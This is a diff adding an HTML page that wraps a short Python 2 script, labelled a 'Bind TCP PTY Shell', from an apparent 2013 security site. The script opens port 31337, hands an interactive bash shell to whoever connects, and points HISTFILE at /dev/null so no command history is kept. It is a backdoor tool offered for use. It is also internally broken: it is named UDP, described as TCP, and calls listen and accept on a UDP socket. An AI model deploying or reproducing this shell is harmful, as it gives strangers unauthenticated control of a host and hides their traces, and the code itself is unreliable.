@@ -1,0 +1,31 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>udp_pty_bind.py</title>
+</head><body>#!/usr/bin/python2<br/>
+&quot;&quot;&quot;<br/>
+Python Bind TCP PTY Shell - testing version<br/>
+infodox - insecurety.net (2013)<br/>
+<br/>
+Binds a PTY to a TCP port on the host it is ran on.<br/>
+&quot;&quot;&quot;<br/>
+import os<br/>
+import pty<br/>
+import socket<br/>
+<br/>
+lport = 31337 # XXX: CHANGEME<br/>
+<br/>
+def main():<br/>
+  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br/>
+  s.bind(('', lport))<br/>
+  s.listen(1)<br/>
+  (rem, addr) = s.accept()<br/>
+  os.dup2(rem.fileno(),0)<br/>
+  os.dup2(rem.fileno(),1)<br/>
+  os.dup2(rem.fileno(),2)<br/>
+  os.putenv(&quot;HISTFILE&quot;,'/dev/null')<br/>
+  pty.spawn(&quot;/bin/bash&quot;)<br/>
+  s.close()<br/>
+	<br/>
+if __name__ == &quot;__main__&quot;:<br/>
+  main()</body></html>
